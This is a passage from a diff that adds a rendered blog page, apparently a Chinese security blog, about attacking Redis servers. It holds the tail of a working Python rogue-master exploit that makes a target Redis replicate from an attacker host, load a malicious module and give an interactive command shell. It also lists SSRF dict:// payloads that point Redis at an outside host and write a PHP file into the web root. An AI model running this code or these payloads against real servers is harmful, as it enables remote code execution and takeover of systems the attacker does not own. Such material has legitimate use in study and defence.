+        cmd<span class="token operator">+=</span>CRLF<span class="token operator">+</span><span class="token string">"$"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>CRLF<span class="token operator">+</span>x
+    cmd<span class="token operator">+=</span>CRLF
+    <span class="token keyword">return</span> cmd
+
+<span class="token keyword">def</span> <span class="token function">redis_connect</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> sock
+
+<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>redis_format<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">interact_shell</span><span class="token punctuation">(</span>sock<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    flag<span class="token operator">=</span><span class="token boolean">True</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">while</span> flag<span class="token punctuation">:</span>
+            shell<span class="token operator">=</span><span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"\033[1;32;40m[*]\033[0m "</span><span class="token punctuation">)</span>
+            shell<span class="token operator">=</span>shell<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"$&#123;IFS&#125;"</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> shell<span class="token operator">==</span><span class="token string">"exit"</span> <span class="token keyword">or</span> shell<span class="token operator">==</span><span class="token string">"quit"</span><span class="token punctuation">:</span>
+                flag<span class="token operator">=</span><span class="token boolean">False</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                send<span class="token punctuation">(</span>sock<span class="token punctuation">,</span><span class="token string">"system.exec &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+        <span class="token keyword">return</span>
+
+
+<span class="token keyword">def</span> <span class="token function">RogueServer</span><span class="token punctuation">(</span>lport<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> CRLF
+    <span class="token keyword">global</span> payload
+    flag<span class="token operator">=</span><span class="token boolean">True</span>
+    result<span class="token operator">=</span><span class="token string">""</span>
+    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+    clientSock<span class="token punctuation">,</span> address <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> flag<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> clientSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">"PING"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+            result<span class="token operator">=</span><span class="token string">"+PONG"</span><span class="token operator">+</span>CRLF
+            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            flag<span class="token operator">=</span><span class="token boolean">True</span>
+        <span class="token keyword">elif</span> <span class="token string">"REPLCONF"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+            result<span class="token operator">=</span><span class="token string">"+OK"</span><span class="token operator">+</span>CRLF
+            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            flag<span class="token operator">=</span><span class="token boolean">True</span>
+        <span class="token keyword">elif</span> <span class="token string">"PSYNC"</span> <span class="token keyword">in</span> data <span class="token keyword">or</span> <span class="token string">"SYNC"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+            result <span class="token operator">=</span> <span class="token string">"+FULLRESYNC "</span> <span class="token operator">+</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">" 1"</span> <span class="token operator">+</span> CRLF
+            result <span class="token operator">+=</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CRLF
+            result <span class="token operator">=</span> result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            result <span class="token operator">+=</span> payload
+            result <span class="token operator">+=</span> CRLF
+            clientSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+            flag<span class="token operator">=</span><span class="token boolean">False</span>
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    lhost<span class="token operator">=</span><span class="token string">"192.168.163.132"</span>
+    lport<span class="token operator">=</span><span class="token number">6666</span>
+    rhost<span class="token operator">=</span><span class="token string">"192.168.163.128"</span>
+    rport<span class="token operator">=</span><span class="token number">6379</span>
+    passwd<span class="token operator">=</span><span class="token string">""</span>
+    redis_sock<span class="token operator">=</span>redis_connect<span class="token punctuation">(</span>rhost<span class="token punctuation">,</span>rport<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> passwd<span class="token punctuation">:</span>
+        send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"AUTH &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>passwd<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"SLAVEOF &#123;&#125; &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>lhost<span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"config set dbfilename &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    RogueServer<span class="token punctuation">(</span>lport<span class="token punctuation">)</span>
+    send<span class="token punctuation">(</span>redis_sock<span class="token punctuation">,</span><span class="token string">"MODULE LOAD ./&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>exp_filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    interact_shell<span class="token punctuation">(</span>redis_sock<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><ul>
+<li>root启用redis</li>
+<li>目标机存在dict协议</li>
+<li>知道网站绝对路径</li>
+</ul>
+<p>假设ssrf的点在ssrf.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span><span class="token keyword">var</span><span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/flushall </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>验证登录：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/auth:password</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>主从复制写入</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/slaveof:192.168.200.4:6379</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>设置保存目录</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/config:set:dir:/var/www/html </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>设置保存文件名称</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/config:set:dbfilename:shell.php </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>本地写文件：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli
+<span class="token builtin class-name">set</span> g1ts <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>&lt;?php phpinfo() ;?><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>远程保存：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/save </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>切断主从复制：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">ssrf<span class="token operator">.</span>php<span class="token operator">?</span>url<span class="token operator">=</span>dict<span class="token punctuation">:</span><span class="token comment">//192.168.200.38:6379/slaveof:no:one </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
